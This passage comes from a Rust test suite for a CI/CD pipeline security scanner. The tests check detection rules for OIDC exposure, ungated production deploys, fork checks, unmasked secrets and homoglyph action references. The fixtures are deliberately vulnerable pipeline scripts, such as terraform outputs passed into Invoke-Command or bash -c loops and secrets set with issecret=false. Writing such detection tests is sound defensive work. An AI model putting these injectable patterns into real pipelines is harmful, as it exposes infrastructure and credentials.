            "BITBUCKET_STEP_OIDC_TOKEN",
            TrustZone::FirstParty,
            meta,
        );
        g.add_edge(step, identity, EdgeKind::HasAccessTo);

        let findings = oidc_identity_in_untrusted_context(&g);
        assert_eq!(findings.len(), 1);
        assert!(findings[0]
            .message
            .starts_with("[oidc_identity_in_untrusted_context]"));
    }

    #[test]
    fn no_workflow_perms_does_not_fire_when_a_job_declares_permissions() {
        // Workflow has no top-level permissions, but one job does — the rule
        // must not fire because the per-job override is what runs.
        let mut g = graph_with_platform("github-actions", ".github/workflows/ci.yml");
        g.metadata
            .insert(META_NO_WORKFLOW_PERMISSIONS.into(), "true".into());
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_PERMISSIONS.into(), "{ contents: read }".into());
        meta.insert(META_IDENTITY_SCOPE.into(), "constrained".into());
        g.add_node_with_metadata(
            NodeKind::Identity,
            "GITHUB_TOKEN (build)",
            TrustZone::FirstParty,
            meta,
        );

        let findings = no_workflow_level_permissions_block(&g);
        assert!(findings.is_empty());
    }

    #[test]
    fn no_workflow_perms_does_not_fire_on_ado_or_gitlab() {
        let mut g = graph_with_platform("azure-devops", "azure-pipelines.yml");
        g.metadata
            .insert(META_NO_WORKFLOW_PERMISSIONS.into(), "true".into());
        assert!(no_workflow_level_permissions_block(&g).is_empty());

        let mut g = graph_with_platform("gitlab", ".gitlab-ci.yml");
        g.metadata
            .insert(META_NO_WORKFLOW_PERMISSIONS.into(), "true".into());
        assert!(no_workflow_level_permissions_block(&g).is_empty());
    }

    // ── prod_deploy_job_no_environment_gate ───────────────────

    #[test]
    fn prod_deploy_no_env_gate_fires_on_ado_prod_sc_without_env_marker() {
        let mut g = graph_with_platform("azure-devops", "azure-pipelines.yml");
        step_with_meta(
            &mut g,
            "AzureCLI : Deploy",
            &[(META_SERVICE_CONNECTION_NAME, "platform-prod-sc")],
        );
        let findings = prod_deploy_job_no_environment_gate(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert_eq!(
            findings[0].category,
            FindingCategory::ProdDeployJobNoEnvironmentGate
        );
        assert!(findings[0].message.contains("platform-prod-sc"));
    }

    #[test]
    fn prod_deploy_no_env_gate_skips_when_env_marker_present() {
        let mut g = graph_with_platform("azure-devops", "azure-pipelines.yml");
        step_with_meta(
            &mut g,
            "AzureCLI : Deploy",
            &[
                (META_SERVICE_CONNECTION_NAME, "platform-prod-sc"),
                (META_ENV_APPROVAL, "true"),
            ],
        );
        assert!(prod_deploy_job_no_environment_gate(&g).is_empty());
    }

    #[test]
    fn prod_deploy_no_env_gate_skips_dev_connection() {
        let mut g = graph_with_platform("azure-devops", "azure-pipelines.yml");
        step_with_meta(
            &mut g,
            "AzureCLI : Deploy",
            &[(META_SERVICE_CONNECTION_NAME, "platform-dev-sc")],
        );
        assert!(prod_deploy_job_no_environment_gate(&g).is_empty());
    }

    #[test]
    fn prod_deploy_no_env_gate_via_edge_to_prod_identity() {
        let mut g = graph_with_platform("azure-devops", "azure-pipelines.yml");
        let step = step_with_meta(&mut g, "AzureCLI : Deploy", &[]);
        let mut id_meta = std::collections::HashMap::new();
        id_meta.insert(META_SERVICE_CONNECTION.into(), "true".into());
        let conn = g.add_node_with_metadata(
            NodeKind::Identity,
            "alz-infra-sc-prd-uks",
            TrustZone::FirstParty,
            id_meta,
        );
        g.add_edge(step, conn, EdgeKind::HasAccessTo);
        let findings = prod_deploy_job_no_environment_gate(&g);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].message.contains("alz-infra-sc-prd-uks"));
    }

    // ── long_lived_secret_without_oidc_recommendation ─────────

    #[test]
    fn ll_secret_without_oidc_emits_for_aws_secret_with_no_oidc_in_graph() {
        let mut g = graph_with_platform("github-actions", ".github/workflows/ci.yml");
        g.add_node(NodeKind::Secret, "AWS_ACCESS_KEY_ID", TrustZone::FirstParty);

        let findings = long_lived_secret_without_oidc_recommendation(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Info);
        assert!(matches!(
            findings[0].recommendation,
            Recommendation::FederateIdentity { .. }
        ));
    }

    #[test]
    fn ll_secret_without_oidc_skips_when_oidc_identity_present() {
        let mut g = graph_with_platform("github-actions", ".github/workflows/ci.yml");
        g.add_node(NodeKind::Secret, "AWS_ACCESS_KEY_ID", TrustZone::FirstParty);
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_OIDC.into(), "true".into());
        g.add_node_with_metadata(
            NodeKind::Identity,
            "AWS/deploy-role",
            TrustZone::FirstParty,
            meta,
        );

        assert!(long_lived_secret_without_oidc_recommendation(&g).is_empty());
    }

    #[test]
    fn ll_secret_without_oidc_skips_unrecognised_secret_names() {
        let mut g = graph_with_platform("github-actions", ".github/workflows/ci.yml");
        g.add_node(NodeKind::Secret, "INTERNAL_KEY", TrustZone::FirstParty);
        // Not AWS/GCP/Azure-shaped — no actionable OIDC migration path.
        assert!(long_lived_secret_without_oidc_recommendation(&g).is_empty());
    }

    // ── pull_request_workflow_inconsistent_fork_check ─────────

    #[test]
    fn inconsistent_fork_check_fires_when_one_job_guarded_one_unguarded() {
        let mut g = graph_with_platform("github-actions", ".github/workflows/pr.yml");
        g.metadata
            .insert(META_TRIGGER.into(), "pull_request".into());
        let secret = g.add_node(NodeKind::Secret, "DEPLOY", TrustZone::FirstParty);
        let s_guarded = step_with_meta(
            &mut g,
            "build[0]",
            &[(META_JOB_NAME, "build"), (META_FORK_CHECK, "true")],
        );
        let s_unguarded = step_with_meta(&mut g, "deploy[0]", &[(META_JOB_NAME, "deploy")]);
        g.add_edge(s_guarded, secret, EdgeKind::HasAccessTo);
        g.add_edge(s_unguarded, secret, EdgeKind::HasAccessTo);

        let findings = pull_request_workflow_inconsistent_fork_check(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::PullRequestWorkflowInconsistentForkCheck
        );
        assert!(findings[0].message.contains("deploy"));
        assert!(findings[0].message.contains("build"));
    }

    #[test]
    fn inconsistent_fork_check_skips_when_all_jobs_guarded() {
        let mut g = graph_with_platform("github-actions", ".github/workflows/pr.yml");
        g.metadata
            .insert(META_TRIGGER.into(), "pull_request".into());
        let secret = g.add_node(NodeKind::Secret, "DEPLOY", TrustZone::FirstParty);
        let s1 = step_with_meta(
            &mut g,
            "build[0]",
            &[(META_JOB_NAME, "build"), (META_FORK_CHECK, "true")],
        );
        let s2 = step_with_meta(
            &mut g,
            "deploy[0]",
            &[(META_JOB_NAME, "deploy"), (META_FORK_CHECK, "true")],
        );
        g.add_edge(s1, secret, EdgeKind::HasAccessTo);
        g.add_edge(s2, secret, EdgeKind::HasAccessTo);
        assert!(pull_request_workflow_inconsistent_fork_check(&g).is_empty());
    }

    #[test]
    fn inconsistent_fork_check_skips_when_no_job_guarded() {
        // Both unguarded → not "inconsistent" (the org never tried). Other
        // rules cover the underlying risk.
        let mut g = graph_with_platform("github-actions", ".github/workflows/pr.yml");
        g.metadata
            .insert(META_TRIGGER.into(), "pull_request".into());
        let secret = g.add_node(NodeKind::Secret, "DEPLOY", TrustZone::FirstParty);
        let s1 = step_with_meta(&mut g, "build[0]", &[(META_JOB_NAME, "build")]);
        let s2 = step_with_meta(&mut g, "deploy[0]", &[(META_JOB_NAME, "deploy")]);
        g.add_edge(s1, secret, EdgeKind::HasAccessTo);
        g.add_edge(s2, secret, EdgeKind::HasAccessTo);
        assert!(pull_request_workflow_inconsistent_fork_check(&g).is_empty());
    }

    // ── terraform_output_via_setvariable_shell_expansion ─────

    /// Helper: add a Step node tagged with the given job and an inline
    /// script body. Returns the node id so the caller can wire it up.
    fn add_script_step_in_job(g: &mut AuthorityGraph, name: &str, job: &str, body: &str) -> NodeId {
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_SCRIPT_BODY.into(), body.into());
        meta.insert(META_JOB_NAME.into(), job.into());
        g.add_node_with_metadata(NodeKind::Step, name, TrustZone::FirstParty, meta)
    }

    #[test]
    fn tf_output_setvariable_fires_on_solarwinds_corpus_pattern() {
        // Faithful reproduction of the
        // `Azure_Landing_Zone/sharedservice-solarwinds/.pipeline/deployment.yml`
        // pattern (lines ~98-180 of the corpus exemplar): a PowerShell@2
        // step reads `$env:TF_OUT_GDSVMS` and emits
        // `##vso[task.setvariable variable=gdsvms]`. A later
        // AzurePowerShell@5 step does `"$(gdsvms)" -split ","` followed by
        // `Invoke-Command` against each VM in the list.
        let mut g = AuthorityGraph::new(source("ado.yml"));
        add_script_step_in_job(
            &mut g,
            "capture-tf-outputs",
            "Deployment_Apply",
            "Write-Host \"TF_OUT_GDSVMS: $env:TF_OUT_GDSVMS\"\n\
             Write-Host \"##vso[task.setvariable variable=gdsvms]$env:TF_OUT_GDSVMS\"\n\
             Write-Host \"##vso[task.setvariable variable=amlinvms]$env:TF_OUT_AMLINVMS\"",
        );
        add_script_step_in_job(
            &mut g,
            "join-vms-to-domain",
            "Deployment_Apply",
            "$GDSvmNames = \"$(gdsvms)\" -split \",\"\n\
             foreach ($vmName in $GDSvmNames) {\n\
               Invoke-Command -ComputerName $vmName -ScriptBlock { Add-Computer }\n\
             }",
        );

        let findings = terraform_output_via_setvariable_shell_expansion(&g);
        // Two captured variables (gdsvms, amlinvms) but only `gdsvms` is
        // referenced in the sink — exactly one finding.
        assert_eq!(findings.len(), 1, "got: {findings:#?}");
        assert_eq!(findings[0].severity, Severity::High);
        assert_eq!(
            findings[0].category,
            FindingCategory::TerraformOutputViaSetvariableShellExpansion
        );
        assert!(findings[0].message.contains("gdsvms"));
        assert!(findings[0].nodes_involved.len() == 2);
    }

    #[test]
    fn tf_output_setvariable_fires_on_literal_terraform_output_cli() {
        // Variant: the capture step actually shells out to
        // `terraform output -raw vm_names` instead of going through the
        // `TF_OUT_*` env-var convention. Sink uses bash -c "$(NAME)".
        let mut g = AuthorityGraph::new(source("ado.yml"));
        add_script_step_in_job(
            &mut g,
            "tf-capture",
            "deploy",
            "VMS=$(terraform output -raw vm_names)\n\
             echo \"##vso[task.setvariable variable=vms;]$VMS\"",
        );
        add_script_step_in_job(
            &mut g,
            "tf-consume",
            "deploy",
            "bash -c \"for vm in $(vms); do ssh $vm uptime; done\"",
        );

        let findings = terraform_output_via_setvariable_shell_expansion(&g);
        assert_eq!(findings.len(), 1, "got: {findings:#?}");
        assert!(findings[0].message.contains("vms"));
    }

    #[test]
    fn tf_output_setvariable_skips_when_only_phase_one_present() {
        // Capture step exists, but no later step in the same job ever
        // references the captured variable in shell-expansion position.
        let mut g = AuthorityGraph::new(source("ado.yml"));
        add_script_step_in_job(
            &mut g,
            "capture",
            "deploy",
            "Write-Host \"##vso[task.setvariable variable=gdsvms]$env:TF_OUT_GDSVMS\"",
        );
        add_script_step_in_job(
            &mut g,
            "innocuous-print",
            "deploy",
            "Write-Host 'Deployment complete.'",
        );

        let findings = terraform_output_via_setvariable_shell_expansion(&g);
        assert!(
            findings.is_empty(),
            "phase-1-only must not fire; got: {findings:#?}"
        );
    }

    #[test]
    fn tf_output_setvariable_skips_when_only_phase_two_present() {
        // Sink step uses $(gdsvms) in shell-expansion position, but no
        // earlier step in the same job ever captured a terraform output
        // and emitted a setvariable for that name. Variable might be
        // defined elsewhere (variable group, vars yaml) — out of scope.
        let mut g = AuthorityGraph::new(source("ado.yml"));
        add_script_step_in_job(&mut g, "noop-first", "deploy", "echo 'starting deploy'");
        add_script_step_in_job(
            &mut g,
            "consume-only",
            "deploy",
            "$names = \"$(gdsvms)\" -split \",\"\n\
             foreach ($n in $names) { Invoke-Command -ComputerName $n -ScriptBlock {} }",
        );

        let findings = terraform_output_via_setvariable_shell_expansion(&g);
        assert!(
            findings.is_empty(),
            "phase-2-only must not fire; got: {findings:#?}"
        );
    }

    #[test]
    fn inconsistent_fork_check_skips_non_pr_trigger() {
        let mut g = graph_with_platform("github-actions", ".github/workflows/push.yml");
        g.metadata.insert(META_TRIGGER.into(), "push".into());
        let secret = g.add_node(NodeKind::Secret, "DEPLOY", TrustZone::FirstParty);
        let s1 = step_with_meta(
            &mut g,
            "build[0]",
            &[(META_JOB_NAME, "build"), (META_FORK_CHECK, "true")],
        );
        let s2 = step_with_meta(&mut g, "deploy[0]", &[(META_JOB_NAME, "deploy")]);
        g.add_edge(s1, secret, EdgeKind::HasAccessTo);
        g.add_edge(s2, secret, EdgeKind::HasAccessTo);
        assert!(pull_request_workflow_inconsistent_fork_check(&g).is_empty());
    }

    // ── gitlab_deploy_job_missing_protected_branch_only ────────

    #[test]
    fn gitlab_deploy_no_protected_only_fires_on_prod_env_without_marker() {
        let mut g = graph_with_platform("gitlab", ".gitlab-ci.yml");
        step_with_meta(&mut g, "deploy-prod", &[("environment_name", "production")]);
        let findings = gitlab_deploy_job_missing_protected_branch_only(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Medium);
        assert_eq!(
            findings[0].category,
            FindingCategory::GitlabDeployJobMissingProtectedBranchOnly
        );
    }

    #[test]
    fn gitlab_deploy_no_protected_only_skips_when_marker_present() {
        let mut g = graph_with_platform("gitlab", ".gitlab-ci.yml");
        step_with_meta(
            &mut g,
            "deploy-prod",
            &[
                ("environment_name", "production"),
                (META_RULES_PROTECTED_ONLY, "true"),
            ],
        );
        assert!(gitlab_deploy_job_missing_protected_branch_only(&g).is_empty());
    }

    #[test]
    fn gitlab_deploy_no_protected_only_skips_dev_environment() {
        let mut g = graph_with_platform("gitlab", ".gitlab-ci.yml");
        step_with_meta(&mut g, "deploy-staging", &[("environment_name", "staging")]);
        assert!(gitlab_deploy_job_missing_protected_branch_only(&g).is_empty());
    }

    // ── compensating-control suppressions ─────────────────────

    #[test]
    fn suppression_checkout_pr_downgraded_when_no_privileged_steps_in_job() {
        // Build a graph where checkout_self_pr_exposure would fire BUT the
        // job has no secret access and no env-gate writes.
        let mut g = graph_with_platform("github-actions", ".github/workflows/lint.yml");
        g.metadata
            .insert(META_TRIGGER.into(), "pull_request_target".into());
        let _checkout = step_with_meta(
            &mut g,
            "lint[0]",
            &[(META_JOB_NAME, "lint"), (META_CHECKOUT_SELF, "true")],
        );
        // A second non-privileged step in the same job.
        step_with_meta(&mut g, "lint[1]", &[(META_JOB_NAME, "lint")]);

        let mut findings = checkout_self_pr_exposure(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High); // pre-suppression
        apply_compensating_controls(&g, &mut findings);
        assert_eq!(
            findings[0].severity,
            Severity::Info,
            "checkout in a job with no privileged steps must downgrade to Info"
        );
        assert!(findings[0].message.contains("downgraded"));
    }

    #[test]
    fn suppression_checkout_pr_unchanged_when_job_has_privileged_step() {
        let mut g = graph_with_platform("github-actions", ".github/workflows/build.yml");
        g.metadata
            .insert(META_TRIGGER.into(), "pull_request_target".into());
        let secret = g.add_node(NodeKind::Secret, "DEPLOY_TOKEN", TrustZone::FirstParty);
        let checkout = step_with_meta(
            &mut g,
            "build[0]",
            &[(META_JOB_NAME, "build"), (META_CHECKOUT_SELF, "true")],
        );
        let priv_step = step_with_meta(&mut g, "build[1]", &[(META_JOB_NAME, "build")]);
        g.add_edge(priv_step, secret, EdgeKind::HasAccessTo);
        // checkout step itself has no edges
        let _ = checkout;

        let mut findings = checkout_self_pr_exposure(&g);
        assert_eq!(findings.len(), 1);
        let pre = findings[0].severity;
        apply_compensating_controls(&g, &mut findings);
        assert_eq!(
            findings[0].severity, pre,
            "must NOT downgrade when same job has privileged steps"
        );
    }

    #[test]
    fn suppression_trigger_context_downgraded_when_all_priv_jobs_fork_checked() {
        // pull_request_target trigger + every privileged step has fork-check.
        let mut g = graph_with_platform("github-actions", ".github/workflows/prt.yml");
        g.metadata
            .insert(META_TRIGGER.into(), "pull_request_target".into());
        let secret = g.add_node(NodeKind::Secret, "DEPLOY", TrustZone::FirstParty);
        let s = step_with_meta(
            &mut g,
            "build[0]",
            &[(META_JOB_NAME, "build"), (META_FORK_CHECK, "true")],
        );
        g.add_edge(s, secret, EdgeKind::HasAccessTo);

        let mut findings = trigger_context_mismatch(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
        apply_compensating_controls(&g, &mut findings);
        assert_eq!(
            findings[0].severity,
            Severity::Medium,
            "trigger_context_mismatch must downgrade Critical → Medium when fork-check universal"
        );
        assert!(findings[0].message.contains("downgraded"));
    }

    #[test]
    fn suppression_trigger_context_unchanged_when_some_priv_steps_unguarded() {
        let mut g = graph_with_platform("github-actions", ".github/workflows/prt.yml");
        g.metadata
            .insert(META_TRIGGER.into(), "pull_request_target".into());
        let secret = g.add_node(NodeKind::Secret, "DEPLOY", TrustZone::FirstParty);
        let s_guard = step_with_meta(
            &mut g,
            "build[0]",
            &[(META_JOB_NAME, "build"), (META_FORK_CHECK, "true")],
        );
        let s_no_guard = step_with_meta(&mut g, "deploy[0]", &[(META_JOB_NAME, "deploy")]);
        g.add_edge(s_guard, secret, EdgeKind::HasAccessTo);
        g.add_edge(s_no_guard, secret, EdgeKind::HasAccessTo);

        let mut findings = trigger_context_mismatch(&g);
        let pre = findings[0].severity;
        apply_compensating_controls(&g, &mut findings);
        assert_eq!(findings[0].severity, pre);
    }

    #[test]
    fn suppression_overpriv_identity_demoted_when_job_has_narrow_override() {
        // Workflow-level GITHUB_TOKEN is broad; one job has constrained override.
        let mut g = graph_with_platform("github-actions", ".github/workflows/ci.yml");
        let mut wf_meta = std::collections::HashMap::new();
        wf_meta.insert(META_PERMISSIONS.into(), "write-all".into());
        wf_meta.insert(META_IDENTITY_SCOPE.into(), "broad".into());
        let wf_token = g.add_node_with_metadata(
            NodeKind::Identity,
            "GITHUB_TOKEN",
            TrustZone::FirstParty,
            wf_meta,
        );
        let mut job_meta = std::collections::HashMap::new();
        job_meta.insert(META_PERMISSIONS.into(), "{ contents: read }".into());
        job_meta.insert(META_IDENTITY_SCOPE.into(), "constrained".into());
        g.add_node_with_metadata(
            NodeKind::Identity,
            "GITHUB_TOKEN (build)",
            TrustZone::FirstParty,
            job_meta,
        );
        let step = g.add_node(NodeKind::Step, "build", TrustZone::FirstParty);
        g.add_edge(step, wf_token, EdgeKind::HasAccessTo);

        let mut findings = over_privileged_identity(&g);
        // Filter to only the workflow-level finding (the constrained job-level
        // override won't fire over_privileged_identity by itself).
        let wf_findings_count = findings
            .iter()
            .filter(|f| {
                f.nodes_involved
                    .first()
                    .and_then(|id| g.node(*id))
                    .map(|n| n.name == "GITHUB_TOKEN")
                    .unwrap_or(false)
            })
            .count();
        assert_eq!(wf_findings_count, 1);
        apply_compensating_controls(&g, &mut findings);
        let demoted = findings.iter().find(|f| {
            f.nodes_involved
                .first()
                .and_then(|id| g.node(*id))
                .map(|n| n.name == "GITHUB_TOKEN")
                .unwrap_or(false)
        });
        let demoted = demoted.expect("workflow-level token finding still present");
        assert_eq!(
            demoted.severity,
            Severity::Info,
            "workflow-level over_priv must downgrade to Info when narrower job override exists"
        );
        assert!(demoted.message.contains("suppressed"));
    }

    #[test]
    fn tf_output_setvariable_skips_when_sink_quotes_in_env_block() {
        // Sink step references `$(gdsvms)` only in `echo "$(gdsvms)"` —
        // a context with no shell-expansion sigils (no bash -c, no eval,
        // no Invoke-Command, no -split, no command substitution, not
        // line-leading). The value is quoted by the shell on its way
        // into echo's argv and never reaches an interpreter.
        let mut g = AuthorityGraph::new(source("ado.yml"));
        add_script_step_in_job(
            &mut g,
            "capture",
            "deploy",
            "Write-Host \"##vso[task.setvariable variable=gdsvms]$env:TF_OUT_GDSVMS\"",
        );
        add_script_step_in_job(
            &mut g,
            "safe-echo",
            "deploy",
            "echo \"gdsvms is: $(gdsvms)\"",
        );

        let findings = terraform_output_via_setvariable_shell_expansion(&g);
        assert!(
            findings.is_empty(),
            "properly-quoted echo must not fire; got: {findings:#?}"
        );
    }

    #[test]
    fn tf_output_setvariable_skips_when_sink_in_different_job() {
        // Capture and sink exist, but in different jobs. Pipeline
        // variable scoping in ADO is per-stage/per-job by default — the
        // chain doesn't compose without explicit cross-job output
        // wiring (which is a separate primitive).
        let mut g = AuthorityGraph::new(source("ado.yml"));
        add_script_step_in_job(
            &mut g,
            "capture",
            "job-a",
            "Write-Host \"##vso[task.setvariable variable=gdsvms]$env:TF_OUT_GDSVMS\"",
        );
        add_script_step_in_job(
            &mut g,
            "consume",
            "job-b",
            "$names = \"$(gdsvms)\" -split \",\"\n\
             foreach ($n in $names) { Invoke-Command -ComputerName $n -ScriptBlock {} }",
        );

        let findings = terraform_output_via_setvariable_shell_expansion(&g);
        assert!(
            findings.is_empty(),
            "cross-job chain must not fire; got: {findings:#?}"
        );
    }

    #[test]
    fn tf_output_setvariable_skips_when_setvariable_lacks_tf_capture_signal() {
        // Inline script emits `task.setvariable` but the source value is
        // a plain pipeline variable, not anything terraform-shaped.
        // Without a TF_OUT_* / `terraform output` capture signal in the
        // body, the rule must not fire — `self_mutating_pipeline`
        // already covers the generic setvariable primitive.
        let mut g = AuthorityGraph::new(source("ado.yml"));
        add_script_step_in_job(
            &mut g,
            "pure-setvar",
            "deploy",
            "Write-Host \"##vso[task.setvariable variable=gdsvms]$(BuildId)\"",
        );
        add_script_step_in_job(
            &mut g,
            "consume",
            "deploy",
            "$names = \"$(gdsvms)\" -split \",\"\n\
             foreach ($n in $names) { Invoke-Command -ComputerName $n -ScriptBlock {} }",
        );

        let findings = terraform_output_via_setvariable_shell_expansion(&g);
        assert!(
            findings.is_empty(),
            "setvariable without terraform-output signal must not fire; got: {findings:#?}"
        );
    }

    // ── setvariable_issecret_false ──────────────────────────

    /// Helper: create an ADO-platform graph with a single Step whose
    /// `META_SCRIPT_BODY` is set to the given script.
    fn ado_graph_with_script(script: &str) -> AuthorityGraph {
        let mut g = graph_with_platform("azure-devops", "ado-pipeline.yml");
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_SCRIPT_BODY.into(), script.into());
        g.add_node_with_metadata(NodeKind::Step, "script-step", TrustZone::FirstParty, meta);
        g
    }

    #[test]
    fn setvariable_issecret_false_fires_on_explicit_false() {
        let g = ado_graph_with_script(
            r###"echo "##vso[task.setvariable variable=MY_TOKEN;issecret=false]$(token)""###,
        );
        let findings = setvariable_issecret_false(&g);
        assert_eq!(findings.len(), 1, "got: {findings:#?}");
        assert_eq!(findings[0].severity, Severity::High);
        assert_eq!(
            findings[0].category,
            FindingCategory::SetvariableIssecretFalse
        );
        assert!(findings[0].message.contains("MY_TOKEN"));
    }

    #[test]
    fn setvariable_issecret_false_skips_issecret_true() {
        let g = ado_graph_with_script(
            r###"echo "##vso[task.setvariable variable=MY_TOKEN;issecret=true]$(token)""###,
        );
        let findings = setvariable_issecret_false(&g);
        assert!(
            findings.is_empty(),
            "issecret=true must not fire; got: {findings:#?}"
        );
    }

    #[test]
    fn setvariable_issecret_false_skips_non_sensitive_name() {
        let g = ado_graph_with_script(
            r###"echo "##vso[task.setvariable variable=BUILD_NUMBER]$(rev)""###,
        );
        let findings = setvariable_issecret_false(&g);
        assert!(
            findings.is_empty(),
            "non-sensitive name must not fire; got: {findings:#?}"
        );
    }

    #[test]
    fn setvariable_issecret_false_fires_when_flag_omitted() {
        let g = ado_graph_with_script(
            r###"echo "##vso[task.setvariable variable=DB_PASSWORD]$(db_pass)""###,
        );
        let findings = setvariable_issecret_false(&g);
        assert_eq!(findings.len(), 1, "got: {findings:#?}");
        assert!(findings[0].message.contains("DB_PASSWORD"));
    }

    #[test]
    fn keyvaultname_does_not_fire() {
        // "key" is a substring of "keyvaultname" but not a token — must not fire.
        let g = ado_graph_with_script(
            r###"echo "##vso[task.setvariable variable=KEYVAULTNAME]my-vault""###,
        );
        let findings = setvariable_issecret_false(&g);
        assert!(
            findings.is_empty(),
            "keyvaultname must not fire (FP regression); got: {findings:#?}"
        );
    }

    #[test]
    fn storage_account_key_still_fires() {
        // "key" is an exact token in "STORAGE_ACCOUNT_KEY" — must still fire.
        let g = ado_graph_with_script(
            r###"echo "##vso[task.setvariable variable=STORAGE_ACCOUNT_KEY]secret""###,
        );
        let findings = setvariable_issecret_false(&g);
        assert_eq!(
            findings.len(),
            1,
            "STORAGE_ACCOUNT_KEY must fire; got: {findings:#?}"
        );
        assert!(findings[0].message.contains("STORAGE_ACCOUNT_KEY"));
    }

    #[test]
    fn github_author_email_does_not_fire() {
        // "auth" is a substring of "author" but not a token — must not fire.
        let g = ado_graph_with_script(
            r###"echo "##vso[task.setvariable variable=GITHUB_AUTHOR_EMAIL]user@example.com""###,
        );
        let findings = setvariable_issecret_false(&g);
        assert!(
            findings.is_empty(),
            "GITHUB_AUTHOR_EMAIL must not fire (FP regression); got: {findings:#?}"
        );
    }

    #[test]
    fn cert_thumbprint_still_fires() {
        // "cert" is an exact token in "CERT_THUMBPRINT" — must still fire.
        let g = ado_graph_with_script(
            r###"echo "##vso[task.setvariable variable=CERT_THUMBPRINT]abc123""###,
        );
        let findings = setvariable_issecret_false(&g);
        assert_eq!(
            findings.len(),
            1,
            "CERT_THUMBPRINT must fire; got: {findings:#?}"
        );
        assert!(findings[0].message.contains("CERT_THUMBPRINT"));
    }

    // ── homoglyph_in_action_ref ──────────────────────────────────

    fn gha_graph_with_action(action: &str) -> AuthorityGraph {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.metadata
            .insert(META_PLATFORM.into(), "github-actions".into());
        g.add_node(NodeKind::Image, action, TrustZone::ThirdParty);
        g
    }

    #[test]
    fn pure_ascii_action_ref_not_flagged() {
        let g = gha_graph_with_action("actions/checkout@v4");
        let findings = check_homoglyph_in_action_ref(&g);
        assert!(
            findings.is_empty(),
            "pure ASCII action ref must not fire; got: {findings:#?}"
        );
    }

    #[test]
    fn division_slash_homoglyph_flagged() {
        // U+2215 DIVISION SLASH instead of U+002F SOLIDUS
        let g = gha_graph_with_action("actions\u{2215}checkout@v4");
        let findings = check_homoglyph_in_action_ref(&g);
        assert_eq!(findings.len(), 1, "got: {findings:#?}");
        assert_eq!(findings[0].category, FindingCategory::HomoglyphInActionRef);
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].message.contains("U+2215"));
    }

    #[test]
    fn cyrillic_a_homoglyph_flagged() {
        // Cyrillic small letter a (U+0430) instead of Latin a (U+0061)
        let g = gha_graph_with_action("\u{0430}ctions/checkout@v4");
        let findings = check_homoglyph_in_action_ref(&g);
        assert_eq!(findings.len(), 1, "got: {findings:#?}");
        assert_eq!(findings[0].category, FindingCategory::HomoglyphInActionRef);
        assert!(findings[0].message.contains("U+0430"));
    }

    #[test]
    fn homoglyph_rule_skips_non_gha_platform() {
        let mut g = AuthorityGraph::new(source("ado.yml"));
        g.metadata
            .insert(META_PLATFORM.into(), "azure-devops".into());
        g.add_node(
            NodeKind::Image,
            "\u{0430}ctions/checkout@v4",
            TrustZone::ThirdParty,
        );
        let findings = check_homoglyph_in_action_ref(&g);
        assert!(
            findings.is_empty(),
            "non-GHA platform must not fire; got: {findings:#?}"
        );
    }

    // ── v3 fingerprint hardening: per-rule distinct-fingerprint coverage ─
    //
    // Rules that historically emitted `nodes_involved: vec![]` collapsed
    // multiple findings of the same rule in one file to a single
    // fingerprint under the v2 algorithm. v3 mixes
    // `extras.fingerprint_anchor` into the canonical input string. These
    // tests guard against regressions where a rule forgets to set the
    // anchor.

    #[test]
    fn v3_template_extends_unpinned_branch_two_aliases_distinct_fingerprints() {
        // Two `resources.repositories[]` entries in one ADO pipeline that
        // both fire `template_extends_unpinned_branch`. Pre-v3 the two
        // findings collided.
        let mut g = AuthorityGraph::new(source("azure-pipelines.yml"));
        let entries = serde_json::json!([
            {"alias": "platform", "repo_type": "git", "name": "org/platform", "used": true},
            {"alias": "scanners", "repo_type": "git", "name": "org/scanners", "used": true},
        ]);
        g.metadata.insert(
            META_REPOSITORIES.into(),
            serde_json::to_string(&entries).unwrap(),
        );
        let findings = template_extends_unpinned_branch(&g);
        assert_eq!(findings.len(), 2);
        let fp_a = crate::finding::compute_fingerprint(&findings[0], &g);
        let fp_b = crate::finding::compute_fingerprint(&findings[1], &g);
        assert_ne!(
            fp_a, fp_b,
            "two unpinned-template findings on different aliases must produce distinct \
             fingerprints (v3 anchor contract)"
        );
    }

    #[test]
    fn v3_unpinned_include_two_components_distinct_fingerprints() {
        // Two `component:` includes without `@version` — same rule fires
        // twice, anchors differ on `target`.
        let mut g = AuthorityGraph::new(source(".gitlab-ci.yml"));
        g.metadata.insert(META_PLATFORM.into(), "gitlab".into());
        let entries = serde_json::json!([
            {"kind": "component", "target": "gitlab.com/group/comp-a", "git_ref": ""},
            {"kind": "component", "target": "gitlab.com/group/comp-b", "git_ref": ""},
        ]);
        g.metadata.insert(
            META_GITLAB_INCLUDES.into(),
            serde_json::to_string(&entries).unwrap(),
        );
        let findings = unpinned_include_remote_or_branch_ref(&g);
        assert_eq!(findings.len(), 2);
        let fp_a = crate::finding::compute_fingerprint(&findings[0], &g);
        let fp_b = crate::finding::compute_fingerprint(&findings[1], &g);
        assert_ne!(
            fp_a, fp_b,
            "two unpinned-include component findings must produce distinct fingerprints"
        );
    }

    #[test]
    fn v3_sensitive_value_in_job_output_two_outputs_distinct_fingerprints() {
        // Same job declares two credential-shaped outputs; both fire,
        // anchors differ on `<job>.<name>:<source>`.
        use crate::graph::META_JOB_OUTPUTS;
        let mut g = AuthorityGraph::new(source(".github/workflows/ci.yml"));
        g.metadata
            .insert(META_PLATFORM.into(), "github-actions".into());
        // Format is `<job>\t<name>\t<source>` joined by `|`.
        g.metadata.insert(
            META_JOB_OUTPUTS.into(),
            "build\tdeploy_token\tsecret|build\tapi_key\toidc".to_string(),
        );
        let findings = sensitive_value_in_job_output(&g);
        assert_eq!(findings.len(), 2);
        let fp_a = crate::finding::compute_fingerprint(&findings[0], &g);
